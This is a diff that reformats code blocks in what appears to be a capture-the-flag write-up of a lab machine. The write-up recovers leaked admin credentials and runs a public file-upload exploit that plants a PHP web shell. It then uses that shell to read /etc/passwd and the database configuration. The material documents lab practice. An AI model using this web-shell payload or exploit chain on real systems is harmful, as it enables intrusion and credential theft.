@@ -140,7 +140,8 @@ This file isn’t on the host anymore, but perhaps was put up there when the box
 
 I spent far too long looking for a config file that would contain the password. I found a password for the database in includes/config.inc.php:
 
-```// Database
+```bash
+// Database
   define('DB_TYPE', 'mysql');
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'root');
@@ -148,21 +149,26 @@ I spent far too long looking for a config file that would contain the password. 
   define('DB_DATABASE', 'ecom');
   define('DB_TABLE_PREFIX', 'lc_');
   define('DB_CONNECTION_CHARSET', 'utf8');
-  define('DB_PERSISTENT_CONNECTIONS', 'false');```
+  define('DB_PERSISTENT_CONNECTIONS', 'false');
+```
 
 The password “changethis” could very well be wrong in this case. It certainly doesn’t work to get into the admin panel.
 
 Eventually some recursive grep found this in shop/admin/login.php:
 
-```if (isset($_POST['login'])) {
+```bash
+if (isset($_POST['login'])) {
     //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
     user::login($_POST['username'], $_POST['password'], $redirect_url, isset($_POST['remember_me']) ? $_POST['remember_me'] : false);
-  }```
+  }
+```
 
 That commented line is interesting. Given the theme of this box is likely that it’s already compromised, maybe the other hacker left that behind to collect creds. That log file is still on the server:
 
-```root@kali# curl http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt
-User: admin Passwd: theNextGenSt0r3!~```
+```bash
+root@kali# curl http://10.10.10.207/shop/admin/.log2301c9430d8593ae.txt
+User: admin Passwd: theNextGenSt0r3!~
+```
 
 Logging in at /shop/admin/login.php with those creds works:
 
@@ -184,8 +190,10 @@ There’s client-side filtering requiring a file with a .xml extension, but I ca
 
 I’ll use the exploit script from here out, but it would be just as easy to do things manually. Running the exploit from searchsploit doesn’t completely work, returning an empty line where the output should be:
 
-```root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
-Shell => http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id```
+```bash
+root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
+Shell => http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id
+```
 
 The exploit is nice enough to give me the address of the webshell, and visiting it returns an empty page:
 
@@ -210,7 +218,8 @@ root@kali# curl -v http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id
 
 So the upload succeeded, but the execution isn’t working. I can check that a different way by modifying the script. It’s this line that sets the payload:
 
-```files = {
+```bash
+files = {
         'vqmod': (rand + ".php", "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); } ?>", "application/xml"),
         'token':one,
         'upload':(None,"Upload")
@@ -222,21 +231,26 @@ I’ll change that to something more benign:
         'vqmod': (rand + ".php", "<?php echo 'darksec was here'; } ?>", "application/xml"),
         'token':one,
         'upload':(None,"Upload")
-    }```
+    }
+```
 
 it works:
 
-```root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
+```bash
+root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
 Shell => http://10.10.10.207/shop/admin/../vqmod/xml/XPKU4.php?c=id
-darksec was here```
+darksec was here
+```
 
 phpinfo() will provide useful information about the box:
 
-```files = {
+```bash
+files = {
         'vqmod': (rand + ".php", '<?php phpinfo();  ?>', "application/xml"),
         'token':one,
         'upload':(None,"Upload")
-    }```
+    }
+```
 
 ```bash
 root@kali# python 45267.py -t http://10.10.10.207/shop/admin/ -u admin -p 'theNextGenSt0r3!~'
@@ -279,25 +293,29 @@ files = {
 
 After running that, I can list a directory:
 
-```root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode "dir=/home"
+```bash
+root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode "dir=/home"
 Array
 (
     [0] => .
     [1] => ..
     [2] => sysadmin
-)```
+)
+```
 
 This user can’t read in /home/sysadmin.
 
 I can also get a file, like /etc/passwd:
 
-```root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode "file=/etc/passwd"
+```bash
+root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode "file=/etc/passwd"
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ...[snip]...
 sysadmin:x:1000:1000:compromise:/home/sysadmin:/bin/bash
 mysql:x:111:113:MySQL Server,,,:/var/lib/mysql:/bin/bash
-red:x:1001:1001::/home/red:/bin/false```
+red:x:1001:1001::/home/red:/bin/false
+```
 
 ### Database
 
@@ -305,7 +323,8 @@ It’s really interesting to note that in the /etc/passwd file, the user mysql h
 
 Looking at mysql’s home directory doesn’t return anything, which indicates a permissions issue. I can try to check out the database, especially to see if it can execute. I’ll pull the config file at the same path I noted in the backup. The DB password is still “changethis”:
 
-```root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode "file=/var/www/html/shop/includes/config.inc.php"
+```bash
+root@kali# curl -s -G http://10.10.10.207/shop/admin/../vqmod/xml/1FFFK.php --data-urlencode "file=/var/www/html/shop/includes/config.inc.php"
 <?php
 ...[snip]...
 // Database
@@ -317,7 +336,8 @@ Looking at mysql’s home directory doesn’t return anything, which indicates a
   define('DB_TABLE_PREFIX', 'lc_');
   define('DB_CONNECTION_CHARSET', 'utf8');
   define('DB_PERSISTENT_CONNECTIONS', 'false');  
-...[snip]...```
+...[snip]...
+```
 
 I’ll add some code to my PHP that will run DB queries:
 
